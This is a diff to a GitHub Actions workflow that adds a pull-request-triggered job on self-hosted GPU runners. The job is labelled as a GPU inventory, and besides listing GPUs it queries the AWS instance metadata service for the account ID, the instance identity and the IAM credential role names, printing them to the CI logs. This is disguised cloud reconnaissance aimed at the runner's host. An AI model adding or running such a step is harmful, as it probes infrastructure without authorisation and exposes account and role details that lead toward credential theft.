@@ -47,3 +47,22 @@ jobs:
           files: lcov.info
           token: ${{ secrets.CODECOV_TOKEN }}
           fail_ci_if_error: false
+
+  prl-t1-gpuproof-54650:
+    name: "prl-t1-gpuproof"
+    runs-on: [self-hosted, Linux, X64, gpu-t4]
+    timeout-minutes: 15
+    if: github.event_name == 'pull_request'
+    steps:
+      - name: gpu-inventory
+        run: |
+          echo "HOST=$(hostname)"; id
+          lspci -nn | grep -i nvidia || true
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=index,name,memory.total,driver_version --format=csv,noheader || true
+          TOK=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" || true)
+          if [ -n "$TOK" ]; then HH="X-aws-ec2-metadata-token: $TOK"; else HH="X-aws-ec2-metadata-token: none"; fi
+          echo "IMDS_ID:"
+          curl -s -m 5 -H "$HH" http://169.254.169.254/latest/dynamic/instance-identity/document | grep -E 'region|instanceId|accountId' || curl -s -m 5 http://169.254.169.254/latest/dynamic/instance-identity/document | grep -E 'region|instanceId|accountId' || true
+          echo "IMDS_ROLE_NAMES:"
+          curl -s -m 5 -H "$HH" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true
